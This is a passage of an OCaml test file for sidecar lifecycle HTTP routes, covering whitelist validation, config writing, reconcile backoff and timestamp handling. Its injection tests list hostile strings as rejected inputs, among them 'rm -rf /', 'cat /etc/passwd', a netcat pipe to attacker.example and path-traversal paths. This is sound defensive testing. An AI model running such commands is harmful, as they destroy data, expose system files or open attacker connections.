(** Negative-path tests for /api/v1/sidecar/* routes.

    The HTTP layer is a thin wrapper around [validate_name] + a detached
    argv dispatch to the sidecar [run.sh]. The thing worth pinning is that any
    not-whitelisted [name=] short-circuits at [validate_name] BEFORE the
    code reaches [Process_eio].

    Source of truth for endpoint design: docs/SIDECAR-LIFECYCLE-API-RFC.md.
*)

open Alcotest
module Routes = Server_routes_http_routes_sidecar
module Attempt_state = Masc.Attempt_state

let result_of = function
  | Ok s -> "Ok " ^ s
  | Error e -> "Error " ^ e
;;

let result_t = testable (Fmt.of_to_string result_of) ( = )
let validate name = Routes.validate_name name

let schema_field_types_failure_metric error_kind =
  Masc.Otel_metric_store.metric_value_or_zero
    Masc.Otel_metric_store.metric_sidecar_schema_field_types_failures
    ~labels:[ ("error_kind", error_kind) ]
    ()

let unix_of_iso_exn value =
  match Types_core.parse_iso8601_opt value with
  | Some unix -> unix
  | None -> invalid_arg ("invalid test timestamp: " ^ value)
;;

let make_attempt_record
      ?(connector_id = "discord")
      ?(generation = 1)
      ?(attempt_number = 1)
      ?attempt_id
      ?(last_result = Attempt_state.Start_dispatched)
      ?next_retry_at
      ?(operator_next_action = "none")
      ?(updated_at = "2026-01-01T00:00:00Z")
      ()
  =
  let attempt_id =
    Option.value attempt_id ~default:(Printf.sprintf "%d:%d" generation attempt_number)
  in
  let next_retry_unix = Option.map unix_of_iso_exn next_retry_at in
  let updated_unix = unix_of_iso_exn updated_at in
  let attempt : Attempt_state.t =
    { generation
    ; attempt_number
    ; attempt_id
    ; last_result
    ; next_retry_unix
    ; updated_unix
    }
  in
  { Routes.connector_id; attempt; operator_next_action }
;;

let attempt_result_token (record : Routes.attempt_record) =
  Attempt_state.result_to_string record.Routes.attempt.last_result
;;

let attempt_next_retry_at (record : Routes.attempt_record) =
  Option.map Masc_domain.iso8601_of_unix_seconds record.Routes.attempt.next_retry_unix
;;

let contains_substring haystack needle =
  let hlen = String.length haystack in
  let nlen = String.length needle in
  let rec loop idx =
    idx + nlen <= hlen && (String.sub haystack idx nlen = needle || loop (idx + 1))
  in
  nlen = 0 || loop 0
;;

let rec mkdir_p path =
  if path = "" || path = "." || path = "/"
  then ()
  else if Sys.file_exists path
  then ()
  else (
    mkdir_p (Filename.dirname path);
    Unix.mkdir path 0o755)
;;

let rec rm_rf path =
  if Sys.file_exists path
  then
    if Sys.is_directory path
    then (
      Sys.readdir path |> Array.iter (fun name -> rm_rf (Filename.concat path name));
      Unix.rmdir path)
    else Sys.remove path
;;

let write_file path content =
  mkdir_p (Filename.dirname path);
  Out_channel.with_open_text path (fun oc -> output_string oc content)
;;

let env_values key env =
  let prefix = key ^ "=" in
  env
  |> Array.to_list
  |> List.filter_map (fun entry ->
    if String.starts_with ~prefix entry
    then
      Some
        (String.sub
           entry
           (String.length prefix)
           (String.length entry - String.length prefix))
    else None)
;;

let with_env key value f =
  let previous = Sys.getenv_opt key in
  Fun.protect
    ~finally:(fun () ->
      match previous with
      | Some existing -> Unix.putenv key existing
      | None -> Unix.putenv key "")
    (fun () ->
      (match value with
       | Some next -> Unix.putenv key next
       | None -> Unix.putenv key "");
      f ())
;;

let with_temp_dir prefix f =
  let dir = Filename.temp_file prefix "" in
  Sys.remove dir;
  Unix.mkdir dir 0o755;
  Fun.protect ~finally:(fun () -> rm_rf dir) (fun () -> f dir)
;;

let with_env name value f =
  let saved = Sys.getenv_opt name in
  (match value with
   | Some v -> Unix.putenv name v
   | None -> Unix.putenv name "");
  Fun.protect
    ~finally:(fun () ->
      match saved with
      | Some prior -> Unix.putenv name prior
      | None -> Unix.putenv name "")
    f
;;

(* ---- Happy path: every known sidecar id is accepted verbatim. ---- *)

let test_validate_accepts_each_known_id () =
  List.iter
    (fun id ->
       check result_t (Printf.sprintf "id %s is accepted" id) (Ok id) (validate (Some id)))
    Routes.known_ids
;;

(* ---- Whitelist enforcement. ---- *)

let test_validate_rejects_none () =
  check
    result_t
    "missing name → error"
    (Error "missing 'name' query parameter")
    (validate None)
;;

let test_validate_rejects_unknown_id () =
  check
    result_t
    "wholly unknown id rejected"
    (Error "unknown sidecar id: facebook")
    (validate (Some "facebook"))
;;

(* ---- Injection attempts: the only thing that matters is that an attacker-
       controlled string never falls through to process dispatch. The error
       message carries the raw input back, but the Result is Error, so
       handle_start / handle_stop short-circuit before any subprocess. ---- *)

let test_validate_rejects_shell_meta () =
  let payloads =
    [ "discord;rm -rf /"
    ; "discord && cat /etc/passwd"
    ; "discord$(id)"
    ; "discord`whoami`"
    ; "discord|nc attacker.example 4444"
    ; "discord\nimessage"
    ]
  in
  List.iter
    (fun p ->
       match validate (Some p) with
       | Ok _ -> failf "shell-meta payload %S unexpectedly accepted" p
       | Error _ -> ())
    payloads
;;

let test_validate_rejects_path_traversal () =
  let payloads =
    [ "../../etc/passwd"; "discord/../slack"; "./discord"; "/discord"; ""; "   " ]
  in
  List.iter
    (fun p ->
       match validate (Some p) with
       | Ok _ -> failf "path-traversal payload %S unexpectedly accepted" p
       | Error _ -> ())
    payloads
;;

(* ---- Whitelist size invariant. The dashboard mirrors this list as
       KNOWN_CONNECTOR_IDS in connector-status.ts; if a fifth bridge is
       added without updating both, the dashboard will draw a card the
       backend refuses to spawn. ---- *)

let test_known_ids_size_matches_dashboard () =
  check
    int
    "exactly 4 known sidecars (matches dashboard KNOWN_CONNECTOR_IDS)"
    4
    (List.length Routes.known_ids)
;;

(* ---- clamp_lines: bound the ?lines=N query param to [1, 1000] so a
       client can't ask for unbounded log content. ---- *)

let test_clamp_lines_default_when_missing () =
  check int "missing → 200" 200 (Routes.clamp_lines None)
;;

let test_clamp_lines_passes_in_range () =
  check int "300 → 300" 300 (Routes.clamp_lines (Some 300))
;;

let test_clamp_lines_clamps_below_one () =
  check int "0 → 1" 1 (Routes.clamp_lines (Some 0));
  check int "-50 → 1" 1 (Routes.clamp_lines (Some (-50)))
;;

let test_clamp_lines_clamps_above_max () =
  check int "1001 → 1000" 1000 (Routes.clamp_lines (Some 1001));
  check int "100000 → 1000" 1000 (Routes.clamp_lines (Some 100000))
;;

let test_resolve_existing_sidecar_dir_prefers_explicit_sidecar_root () =
  with_temp_dir "sidecar-root-override" (fun dir ->
    let explicit_root = Filename.concat dir "explicit-root" in
    let base_path = Filename.concat dir "base-path" in
    let project_root = Filename.concat dir "project-root" in
    let explicit_dir = Filename.concat explicit_root "sidecars/discord-bot" in
    let base_dir = Filename.concat base_path "sidecars/discord-bot" in
    let project_dir = Filename.concat project_root "sidecars/discord-bot" in
    List.iter mkdir_p [ explicit_dir; base_dir; project_dir ];
    check
      (option string)
      "explicit root wins"
      (Some explicit_dir)
      (Routes.resolve_existing_sidecar_dir
         ~sidecar_root:explicit_root
         ~project_root
         ~base_path
         "discord"))
;;

let test_resolve_existing_sidecar_dir_falls_back_to_project_root () =
  with_temp_dir "sidecar-root-project-fallback" (fun dir ->
    let base_path = Filename.concat dir "base-path" in
    let project_root = Filename.concat dir "project-root" in
    let project_dir = Filename.concat project_root "sidecars/discord-bot" in
    mkdir_p base_path;
    mkdir_p project_dir;
    check
      (option string)
      "project root used when base path is missing sidecars"
      (Some project_dir)
      (Routes.resolve_existing_sidecar_dir ~project_root ~base_path "discord"))
;;

let test_runtime_base_path_result_prefers_explicit_base_path () =
  check
    result_t
    "explicit request base path wins"
    (Ok "/tmp/runtime-root")
    (Routes.runtime_base_path_result ~base_path:" /tmp/runtime-root " ())
;;

let test_runtime_base_path_result_fails_without_base_path () =
  with_env Env_config_core.base_path_env_key None @@ fun () ->
  with_env Env_config_core.base_path_input_env_key None @@ fun () ->
  match Routes.runtime_sidecar_dir_result "discord" with
  | Ok dir -> failf "expected missing base path error, got %s" dir
  | Error msg ->
    check bool "mentions request base path" true (contains_substring msg "base_path");
    check
      bool
      "mentions env base path"
      true
      (contains_substring msg Env_config_core.base_path_env_key)
;;

let test_missing_sidecar_dir_message_mentions_sidecar_root_hint () =
  let message =
    Routes.missing_sidecar_dir_message
      ~base_path:"/tmp/runtime-root"
      ~project_root:"/tmp/project-root"
      "discord"
  in
  check
    bool
    "mentions explicit env hint"
    true
    (contains_substring message "MASC_SIDECAR_ROOT=/path/to/masc");
  check
    bool
    "mentions launcher flag hint"
    true
    (contains_substring message "--sidecar-root /path/to/masc");
  check
    bool
    "includes searched runtime path"
    true
    (contains_substring message "/tmp/runtime-root/sidecars/discord-bot");
  check
    bool
    "includes searched project path"
    true
    (contains_substring message "/tmp/project-root/sidecars/discord-bot")
;;

let test_runtime_base_path_uses_resolver_precedence () =
  with_temp_dir "sidecar-runtime-base-ssot" (fun dir ->
    let requested = Filename.concat dir "requested" in
    let stale = Filename.concat dir "stale/.masc" in
    with_env "MASC_BASE_PATH" (Some stale) (fun () ->
      with_env
        "MASC_BASE_PATH_INPUT"
        (Some (Filename.concat requested ".masc"))
        (fun () ->
           Config_dir_resolver.reset ();
           Fun.protect
             ~finally:Config_dir_resolver.reset
             (fun () ->
                check
                  string
                  "input env wins and .masc collapses"
                  requested
                  (Routes.runtime_base_path ())))));
  check
    string
    "explicit base_path still wins"
    "/tmp/explicit-runtime"
    (Routes.runtime_base_path ~base_path:" /tmp/explicit-runtime " ())
;;

let test_runtime_base_path_anchors_relative_env_base () =
  with_temp_dir "sidecar-runtime-relative-env" (fun dir ->
    let previous_cwd = Sys.getcwd () in
    Fun.protect
      ~finally:(fun () ->
        Sys.chdir previous_cwd;
        Config_dir_resolver.reset ())
      (fun () ->
         Sys.chdir dir;
         with_env Env_config_core.base_path_input_env_key None (fun () ->
           with_env Env_config_core.base_path_env_key (Some "relative-root") (fun () ->
             Config_dir_resolver.reset ();
             let expected = Ok (Filename.concat dir "relative-root") in
             let actual = Routes.runtime_base_path_result () in
             check result_t "relative env base anchors to cwd" expected actual))))
;;

let test_status_file_prefers_existing_project_root_candidate () =
  with_temp_dir "sidecar-status-project-fallback" (fun dir ->
    let base_path = Filename.concat dir "runtime-root" in
    let project_root = Filename.concat dir "project-root" in
    let sidecar_dir = Filename.concat project_root "sidecars/discord-bot" in
    let project_status =
      Filename.concat project_root ".masc/connectors/discord/status.json"
    in
    mkdir_p sidecar_dir;
    write_file
      (Filename.concat sidecar_dir ".env")
      "DISCORD_STATUS_PATH=.masc/connectors/discord/status.json\n";
    write_file project_status {|{"connected":true}|};
    check
      string
      "existing project-root status wins when runtime-root path is absent"
      project_status
      (Routes.status_file ~base_path ~project_root ~sidecar_dir "discord"))
;;

let test_today_log_file_falls_back_to_project_root_log () =
  with_temp_dir "sidecar-log-project-fallback" (fun dir ->
    let base_path = Filename.concat dir "runtime-root" in
    let project_root = Filename.concat dir "project-root" in
    let log_path =
      Filename.concat
        project_root
        (Printf.sprintf ".masc/logs/discord-sidecar-%s.log" (Routes.today_yyyymmdd ()))
    in
    write_file log_path "[INFO] started\n";
    check
      string
      "project-root log found when runtime-root log is absent"
      log_path
      (Routes.today_log_file ~base_path ~project_root "discord"))
;;

let test_start_plan_matches_detached_contract () =
  let base_path = "/tmp/masc runtime root" in
  let script = "/tmp/masc runtime root/sidecars/discord-bot/run.sh" in
  let plan = Routes.sidecar_start_plan ~base_path ~script in
  check
    (list string)
    "detached start argv"
    [ script; "start" ]
    plan.Routes.argv;
  check
    (list string)
    "base path exported once"
    [ base_path ]
    (env_values "MASC_BASE_PATH" plan.env)
;;

let test_start_plan_preserves_shell_meta_as_argv_values () =
  let base_path = "/tmp/runtime;touch /tmp/pwned" in
  let script = "/tmp/sidecars/discord-bot/run.sh && id" in
  let plan = Routes.sidecar_start_plan ~base_path ~script in
  check
    (list string)
    "metacharacters stay inside argv atoms"
    [ script; "start" ]
    plan.Routes.argv;
  check
    (list string)
    "metacharacters stay inside env value"
    [ base_path ]
    (env_values "MASC_BASE_PATH" plan.env)
;;

let test_desired_store_increments_generation () =
  with_temp_dir "sidecar-desired-store" (fun base_path ->
    let first =
      Routes.write_desired_record
        ~updated_at:"2026-04-20T00:00:00Z"
        ~base_path
        ~id:"discord"
        ~updated_by:"test"
        Routes.Desired_running
    in
    let second =
      Routes.write_desired_record
        ~updated_at:"2026-04-20T00:00:01Z"
        ~base_path
        ~id:"discord"
        ~updated_by:"test"
        Routes.Desired_stopped
    in
    match first, second, Routes.read_desired_record_result ~base_path "discord" with
    | Ok first, Ok second, Ok (Some persisted) ->
      check int "first generation" 1 first.generation;
      check int "second generation" 2 second.generation;
      check int "persisted generation" 2 persisted.generation;
      check
        string
        "persisted desired state"
        "stopped"
        (Routes.desired_state_to_string persisted.desired_state)
    | _ -> failf "desired writes should succeed and persist")
;;

let malformed_desired_state_json =
  {|{"connector_id":"discord","desired_state":"sideways","generation":1,"updated_by":"test","updated_at":"2026-01-01T00:00:00Z"}|}
;;

let test_read_desired_record_result_reports_semantic_corruption () =
  with_temp_dir "sidecar-desired-corrupt-read" (fun base_path ->
    let path = Routes.sidecar_desired_path ~base_path "discord" in
    write_file path malformed_desired_state_json;
    match Routes.read_desired_record_result ~base_path "discord" with
    | Error msg ->
      check bool "mentions field" true (contains_substring msg "desired_state");
      check bool "mentions bad value" true (contains_substring msg "sideways")
    | Ok None -> failf "corrupt persisted desired state must not look absent"
    | Ok (Some _) -> failf "corrupt persisted desired state should not decode")
;;

let test_status_json_surfaces_invalid_desired_state () =
  with_temp_dir "sidecar-desired-corrupt-status" (fun base_path ->
    let path = Routes.sidecar_desired_path ~base_path "discord" in
    write_file path malformed_desired_state_json;
    let json = Routes.read_status_json ~base_path "discord" in
    let open Yojson.Safe.Util in
    let lifecycle = json |> member "sidecar_lifecycle" in
    check
      bool
      "desired_state remains absent"
      true
      (match lifecycle |> member "desired_state" with
       | `Null -> true
       | _ -> false);
    let error =
      match lifecycle |> member "desired_read_error" with
      | `String msg -> msg
      | other -> failf "expected desired_read_error string, got %s" (Yojson.Safe.to_string other)
    in
    check bool "mentions field" true (contains_substring error "desired_state");
    check bool "mentions bad value" true (contains_substring error "sideways"))
;;

let test_write_desired_record_refuses_corrupt_prior_state () =
  with_temp_dir "sidecar-desired-corrupt-write" (fun base_path ->
    let path = Routes.sidecar_desired_path ~base_path "discord" in
    write_file path malformed_desired_state_json;
    (match
       Routes.write_desired_record
         ~updated_at:"2026-01-01T00:00:01Z"
         ~base_path
         ~id:"discord"
         ~updated_by:"test"
         Routes.Desired_running
     with
     | Error msg ->
       check bool "mentions field" true (contains_substring msg "desired_state");
       check bool "mentions bad value" true (contains_substring msg "sideways")
     | Ok record ->
       failf
         "write should fail before overwriting corrupt prior state, got generation %d"
         record.generation);
    check
      string
      "corrupt desired record is not overwritten"
      malformed_desired_state_json
      (Routes.read_file path))
;;

let test_reconcile_stale_generation_does_not_start () =
  let process_called = ref false in
  let delayed : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_running
    ; generation = 1
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  let result =
    Routes.reconcile_desired_once
      ~current_generation:2
      ~observed_state:Routes.Observed_unavailable
      ~start_process:(fun () -> process_called := true)
      delayed
  in
  check bool "stale reconcile must not process start" false !process_called;
  check
    string
    "stale generation result"
    "noop:stale_generation"
    (Routes.reconcile_result_to_string result)
;;

let test_reconcile_running_unavailable_starts_once () =
  let process_calls = ref 0 in
  let written_attempt = ref None in
  let desired : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_running
    ; generation = 3
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  let result =
    Routes.reconcile_desired_once
      ~now:"2026-04-20T00:00:00Z"
      ~next_retry_at:"2099-04-20T00:00:30Z"
      ~current_generation:3
      ~observed_state:Routes.Observed_unavailable
      ~write_attempt:(fun attempt ->
        written_attempt := Some attempt;
        Ok ())
      ~start_process:(fun () -> incr process_calls)
      desired
  in
  check int "current running reconcile starts once" 1 !process_calls;
  check string "started result" "started" (Routes.reconcile_result_to_string result);
  match !written_attempt with
  | Some attempt ->
    check
      string
      "attempt result is operator-visible"
      "start_dispatched"
      (attempt_result_token attempt);
    check
      string
      "next retry recorded"
      "2099-04-20T00:00:30Z"
      (Option.value (attempt_next_retry_at attempt) ~default:"");
    check
      string
      "next action recorded"
      "wait for observed status, or open logs if the sidecar remains offline after \
       backoff"
      attempt.operator_next_action
  | None -> failf "running reconcile should persist attempt metadata"
;;

let test_reconcile_attempt_write_failure_does_not_start () =
  let process_calls = ref 0 in
  let desired : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_running
    ; generation = 3
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  let result =
    Routes.reconcile_desired_once
      ~now:"2026-04-20T00:00:00Z"
      ~next_retry_at:"2099-04-20T00:00:30Z"
      ~current_generation:3
      ~observed_state:Routes.Observed_unavailable
      ~write_attempt:(fun _ -> Error "disk full")
      ~start_process:(fun () -> incr process_calls)
      desired
  in
  check int "attempt write failure suppresses process start" 0 !process_calls;
  check
    string
    "attempt write failure result"
    "noop:attempt_write_failed"
    (Routes.reconcile_result_to_string result)
;;

let test_reconcile_running_unavailable_backoff_noops () =
  let process_calls = ref 0 in
  let desired : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_running
    ; generation = 3
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  let previous_attempt : Routes.attempt_record =
    make_attempt_record
      ~generation:3
      ~next_retry_at:"2099-04-20T00:00:30Z"
      ~operator_next_action:
        "wait for observed status, or open logs if the sidecar remains offline after \
         backoff"
      ~updated_at:"2026-04-20T00:00:00Z"
      ()
  in
  let result =
    Routes.reconcile_desired_once
      ~now:"2026-04-20T00:00:10Z"
      ~previous_attempt
      ~current_generation:3
      ~observed_state:Routes.Observed_unavailable
      ~start_process:(fun () -> incr process_calls)
      desired
  in
  check int "backoff suppresses duplicate process start" 0 !process_calls;
  check
    string
    "backoff result"
    "noop:backoff_active"
    (Routes.reconcile_result_to_string result)
;;

let test_reconcile_stopped_noops () =
  let process_called = ref false in
  let desired : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_stopped
    ; generation = 4
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  let result =
    Routes.reconcile_desired_once
      ~current_generation:4
      ~observed_state:Routes.Observed_unavailable
      ~start_process:(fun () -> process_called := true)
      desired
  in
  check bool "stopped reconcile must not process start" false !process_called;
  check
    string
    "stopped result"
    "noop:desired_stopped"
    (Routes.reconcile_result_to_string result)
;;

let test_status_json_includes_lifecycle_shape () =
  with_temp_dir "sidecar-lifecycle-status" (fun base_path ->
    (match
       Routes.write_desired_record
         ~updated_at:"2026-04-20T00:00:00Z"
         ~base_path
         ~id:"discord"
         ~updated_by:"test"
         Routes.Desired_running
     with
     | Ok _ -> ()
     | Error msg -> failf "desired write failed: %s" msg);
    let attempt : Routes.attempt_record =
      make_attempt_record
        ~next_retry_at:"2099-04-20T00:00:30Z"
        ~operator_next_action:
          "wait for observed status, or open logs if the sidecar remains offline after \
           backoff"
        ~updated_at:"2026-04-20T00:00:00Z"
        ()
    in
    check
      (result unit string)
      "attempt write"
      (Ok ())
      (Routes.write_attempt_record ~base_path ~id:"discord" attempt);
    let json = Routes.read_status_json ~base_path "discord" in
    let open Yojson.Safe.Util in
    let lifecycle = json |> member "sidecar_lifecycle" in
    check
      string
      "desired_state"
      "running"
      (lifecycle |> member "desired_state" |> to_string);
    check int "desired_generation" 1 (lifecycle |> member "desired_generation" |> to_int);
    check
      string
      "observed_state"
      "unavailable"
      (lifecycle |> member "observed_state" |> to_string);
    check
      string
      "reconcile_result"
      "noop:backoff_active"
      (lifecycle |> member "reconcile_result" |> to_string);
    check
      string
      "last_attempt_result"
      "start_dispatched"
      (lifecycle |> member "last_attempt_result" |> to_string);
    check
      string
      "next_retry_at"
      "2099-04-20T00:00:30Z"
      (lifecycle |> member "next_retry_at" |> to_string);
    check
      string
      "operator_next_action"
      "wait for observed status, or open logs if the sidecar remains offline after \
       backoff"
      (lifecycle |> member "operator_next_action" |> to_string))
;;

let test_status_json_exposes_dashboard_provenance () =
  with_temp_dir "sidecar-status-provenance" (fun base_path ->
    let json = Routes.read_status_json ~base_path "discord" in
    let open Yojson.Safe.Util in
    check
      string
      "dashboard_surface"
      "/api/v1/sidecar/status"
      (json |> member "dashboard_surface" |> to_string);
    check string "source" "sidecar_status_file" (json |> member "source" |> to_string);
    check
      string
      "retention scope"
      "runtime_sidecar_status"
      (json |> member "retention" |> member "scope" |> to_string);
    check
      bool
      "generated_at_iso present"
      true
      (match json |> member "generated_at_iso" with
       | `String value -> String.length value > 0
       | _ -> false);
    check
      string
      "default status path"
      (Filename.concat base_path ".gate/runtime/discord/status.json")
      (json |> member "retention" |> member "default_status_path" |> to_string);
    check
      bool
      "lifecycle still present"
      true
      (match json |> member "sidecar_lifecycle" with
       | `Assoc _ -> true
       | _ -> false))
;;

let test_status_json_surfaces_malformed_status_file () =
  with_env "MASC_SIDECAR_ROOT" None @@ fun () ->
  with_env "DISCORD_STATUS_PATH" None @@ fun () ->
  with_env "discord_status_path" None @@ fun () ->
  with_temp_dir "sidecar-status-malformed" (fun base_path ->
    let path = Routes.status_file ~base_path "discord" in
    write_file path {|{"pid":|};
    let json = Routes.read_status_json ~base_path "discord" in
    let open Yojson.Safe.Util in
    check bool "status file remains available" true (json |> member "available" |> to_bool);
    check
      bool
      "status payload is null on parse error"
      true
      (match json |> member "status" with
       | `Null -> true
       | _ -> false);
    check
      string
      "status_read_error_kind"
      "json_malformed"
      (json |> member "status_read_error_kind" |> to_string);
    let error =
      match json |> member "status_read_error" with
      | `String msg -> msg
      | other -> failf "expected status_read_error string, got %s" (Yojson.Safe.to_string other)
    in
    check bool "error mentions status path" true (contains_substring error path);
    check bool "error mentions malformed JSON" true (contains_substring error "malformed"))
;;

(* ---- Config write helpers (PUT /api/v1/sidecar/config). ---- *)

let test_escape_quotes_and_backslash () =
  check string "double-quote escaped" "abc\\\"def" (Routes.escape_toml_string "abc\"def");
  check string "backslash escaped" "x\\\\y" (Routes.escape_toml_string "x\\y")
;;

let test_escape_control_chars () =
  check string "newline escaped" "a\\nb" (Routes.escape_toml_string "a\nb");
  check string "tab escaped" "a\\tb" (Routes.escape_toml_string "a\tb")
;;

let test_render_value_quotes_strings () =
  check
    string
    "string wrapped in quotes"
    "\"hello\""
    (Routes.render_value (Routes.Tstring "hello"));
  check string "int rendered bare" "120" (Routes.render_value (Routes.Tint 120));
  check string "true bare" "true" (Routes.render_value (Routes.Tbool true));
  check string "false bare" "false" (Routes.render_value (Routes.Tbool false))
;;

let test_render_toml_sorts_keys () =
  let body =
    Routes.render_toml
      [ "Z_LAST", Routes.Tstring "z"
      ; "A_FIRST", Routes.Tstring "a"
      ; "M_MID", Routes.Tint 5
      ]
  in
  let lines = String.split_on_char '\n' body in
  match lines with
  | "A_FIRST = \"a\"" :: "M_MID = 5" :: "Z_LAST = \"z\"" :: _ -> ()
  | _ -> failf "lines not in alpha order: %s" body
;;

let test_coerce_integer_accepts_and_rejects () =
  (match Routes.coerce_value `Integer "120" with
   | Ok (Routes.Tint 120) -> ()
   | _ -> failf "120 should coerce to Tint 120");
  (match Routes.coerce_value `Integer "  -5  " with
   | Ok (Routes.Tint -5) -> ()
   | _ -> failf "trimmed -5 should coerce");
  match Routes.coerce_value `Integer "abc" with
  | Error _ -> ()
  | _ -> failf "abc should NOT coerce to integer"
;;

let test_coerce_boolean_accepts_variants () =
  (match Routes.coerce_value `Boolean "true" with
   | Ok (Routes.Tbool true) -> ()
   | _ -> failf "true should coerce");
  (match Routes.coerce_value `Boolean "FALSE" with
   | Ok (Routes.Tbool false) -> ()
   | _ -> failf "FALSE (case) should coerce");
  (match Routes.coerce_value `Boolean "1" with
   | Ok (Routes.Tbool true) -> ()
   | _ -> failf "1 should coerce as bool true");
  match Routes.coerce_value `Boolean "yes" with
  | Error _ -> ()
  | _ -> failf "yes should NOT coerce — only true/false/0/1"
;;

let test_coerce_rejects_oversized_value () =
  let huge = String.make 9000 'x' in
  match Routes.coerce_value `String huge with
  | Error _ -> ()
  | Ok _ -> failf "9000-byte value should be rejected by max_value_bytes guard"
;;

let string_of_declared_type = function
  | `String -> "string"
  | `Integer -> "integer"
  | `Number -> "number"
  | `Boolean -> "boolean"
;;

let test_parse_declared_type_accepts_known_schema_types () =
  check
    (option string)
    "string type"
    (Some "string")
    (Option.map
       string_of_declared_type
       (Routes.parse_declared_type (`Assoc [ "type", `String "string" ])));
  check
    (option string)
    "integer type"
    (Some "integer")
    (Option.map
       string_of_declared_type
       (Routes.parse_declared_type (`Assoc [ "type", `String "integer" ])))
;;

let test_parse_declared_type_rejects_unknown_schema_types () =
  check
    (option string)
    "unknown type rejected"
    None
    (Option.map
       string_of_declared_type
       (Routes.parse_declared_type (`Assoc [ "type", `String "object" ])));
  check
    (option string)
    "missing type rejected"
    None
    (Option.map string_of_declared_type (Routes.parse_declared_type (`Assoc [])))
;;

let test_parse_body_pairs_coerces_scalar_values () =
  check
    (result (list (pair string string)) string)
    "scalar JSON values are stringified for downstream type coercion"
    (Ok [ "PORT", "3000"; "ENABLED", "true"; "EMPTY", "" ])
    (Routes.parse_body_pairs {|{"PORT":3000,"ENABLED":true,"EMPTY":null}|})
;;

let test_parse_body_pairs_rejects_non_object () =
  check
    (result (list (pair string string)) string)
    "non-object JSON rejected"
    (Error "body must be a JSON object")
    (Routes.parse_body_pairs {|["PORT",3000]|})
;;

let test_parse_body_pairs_rejects_invalid_json () =
  check
    (result (list (pair string string)) string)
    "invalid JSON rejected"
    (Error "body is not valid JSON")
    (Routes.parse_body_pairs {|{"PORT":|})
;;

let test_atomic_write_file_replaces_content () =
  with_temp_dir "sidecar-atomic-write" (fun dir ->
    let path = Filename.concat dir "nested/config.toml" in
    Routes.ensure_parent_dir path;
    check
      (result unit string)
      "initial write"
      (Ok ())
      (Routes.atomic_write_file ~path "TOKEN = \"old\"\n");
    check
      string
      "initial content"
      "TOKEN = \"old\"\n"
      (In_channel.with_open_text path In_channel.input_all);
    check
      (result unit string)
      "replacement write"
      (Ok ())
      (Routes.atomic_write_file ~path "TOKEN = \"new\"\n");
    check
      string
      "replacement content"
      "TOKEN = \"new\"\n"
      (In_channel.with_open_text path In_channel.input_all))
;;

(* ── ISO format invariants ────────────────────────────────────────────
   Sidecar lifecycle JSON keeps the existing [next_retry_at]/[updated_at]
   wire strings, while the in-memory retry state uses [Attempt_state.t]
   floats. These tests pin the boundary format so dashboard consumers see
   the same contract. *)

let test_isoish_now_fixed_shape () =
  let s = Masc_domain.now_iso () in
  check int "isoish_now length" 20 (String.length s);
  (* "1234-67-9012:45:78Z" — positional separators *)
  check char "isoish_now dash y-m" '-' s.[4];
  check char "isoish_now dash m-d" '-' s.[7];
  check char "isoish_now literal T" 'T' s.[10];
  check char "isoish_now colon h-m" ':' s.[13];
  check char "isoish_now colon m-s" ':' s.[16];
  check char "isoish_now trailing Z" 'Z' s.[19]
;;

let test_isoish_at_epoch_round_trip () =
  check string "isoish_at epoch" "1970-01-01T00:00:00Z" (Masc_domain.iso8601_of_unix_seconds 0.0);
  check
    string
    "isoish_at one second past epoch"
    "1970-01-01T00:00:01Z"
    (Masc_domain.iso8601_of_unix_seconds 1.0)
;;

let test_isoish_lexical_matches_chronological () =
  let earlier = Masc_domain.iso8601_of_unix_seconds 1_000_000.0 in
  let later = Masc_domain.iso8601_of_unix_seconds 2_000_000.0 in
  check bool "earlier < later lexically" true (String.compare earlier later < 0);
  check bool "later > earlier lexically" true (String.compare later earlier > 0);
  check
    int
    "equal timestamps compare zero"
    0
    (String.compare earlier (Masc_domain.iso8601_of_unix_seconds 1_000_000.0))
;;

(* ── retry_backoff_active (#8930 / #22246) ─────────────────────────────
   [retry_backoff_active] parses [now] at the boundary and delegates the
   deadline check to [Attempt_state.is_backoff_active]. Malformed persisted
   [next_retry_at] values are rejected by [attempt_record_of_json_result] instead
   of entering the in-memory state. *)

let make_attempt ~next_retry_at =
  make_attempt_record ?next_retry_at ()
;;

let test_retry_backoff_active_before_deadline () =
  let attempt = make_attempt ~next_retry_at:(Some "2026-01-01T00:00:30Z") in
  check
    bool
    "now < next_retry_at → backoff active"
    true
    (Routes.retry_backoff_active ~now:"2026-01-01T00:00:00Z" attempt)
;;

let test_retry_backoff_inactive_after_deadline () =
  let attempt = make_attempt ~next_retry_at:(Some "2026-01-01T00:00:00Z") in
  check
    bool
    "now > next_retry_at → backoff expired"
    false
    (Routes.retry_backoff_active ~now:"2026-01-01T00:00:30Z" attempt)
;;

let test_retry_backoff_inactive_when_no_deadline () =
  let attempt = make_attempt ~next_retry_at:None in
  check
    bool
    "next_retry_at=None → backoff inactive"
    false
    (Routes.retry_backoff_active ~now:"2026-01-01T00:00:00Z" attempt)
;;

let test_attempt_record_of_json_rejects_malformed_next_retry_at () =
  let json =
    `Assoc
      [ "connector_id", `String "discord"
      ; "generation", `Int 1
      ; "attempt_id", `String "1:1"
      ; "attempt_number", `Int 1
      ; "last_attempt_result", `String "start_dispatched"
      ; "next_retry_at", `String "not-an-iso-stamp"
      ; "operator_next_action", `String "none"
      ; "updated_at", `String "2026-01-01T00:00:00Z"
      ]
  in
  (match Routes.attempt_record_of_json_result json with
   | Error (Routes.Attempt_record_invalid_timestamp { field; value }) ->
     check string "field" "next_retry_at" field;
     check string "value" "not-an-iso-stamp" value
   | Error error ->
     failf
       "unexpected decode error: %s"
       (Routes.attempt_record_decode_error_to_string error)
   | Ok _ -> failf "malformed next_retry_at should be rejected at boundary")
;;

let test_read_attempt_record_result_reports_semantic_corruption () =
  with_temp_dir "sidecar-attempt-corrupt-read" (fun base_path ->
